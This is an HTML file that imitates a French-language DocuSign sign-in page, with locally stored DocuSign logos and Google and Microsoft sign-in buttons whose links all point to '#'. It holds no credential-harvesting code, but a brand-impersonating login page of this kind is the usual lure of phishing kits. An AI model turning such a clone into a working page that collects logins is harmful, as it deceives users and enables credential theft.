<!DOCTYPE html>
<html>
<head>
  <title>DocuSign</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
  <div id="header">
    <img id="logo" src="logo/ds_logo_black_rgb_0.png" alt="DocuSign Logo">
  </div>
  
  <div id="content">
    <h2 class="header-text">Se connecter à DocuSign</h2>
  
    <div id="buttons-container"> 
      <a class="button button-google" href="#">
        <div class="button-container">
          <img class="logo-icon" src="logo/Google_ G _Logo.svg.png" alt="Google Logo" width="26" height="29">
          <span class="button-text">Sign in with Google</span>
        </div>
      </a>
      <a class="button button-microsoft" href="#">
        <div class="button-container">
          <img class="logo-icon" src="logo/micosoft.png" alt="Microsoft Logo" width="36" height="36">
          <span class="button-text">Sign in with Microsoft</span>
        </div>
      </a>
    </div>
  
    <p style="text-align: center;"><a href="#" class="large-text">S'inscrire gratuitement</a></p>
  </div>

  <div id="footer">
    <div id="footer-left">
      <span>Technologie</span>
      <img id="footer-logo" src="logo/ds_logo_black_rgb_0.png" alt="Your Logo" width="90" height="30">
    </div>
    <div id="footer-center">
      <span id="footer-language">
        <i id="language-triangle" class="fas fa-caret-down"></i>
        Français (France)
      </span>
      <a class="footer-link" href="#">Nous contacter</a>
      <span class="footer-bar">|</span>
      <a class="footer-link" href="#">Conditions d'utilisation</a>
      <span class="footer-bar">|</span>
      <a class="footer-link" href="#">Confidentialité</a>
      <span class="footer-bar">|</span>
      <a class="footer-link" href="#">Propriété intellectuelle</a>
      <span class="footer-bar">|</span>
      <a class="footer-link" href="#">Trust</a>

      <div id="footer-right">
        Copyright &copy; 2023, Inc. Tous droits réservés.
      </div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
</body>
</html>
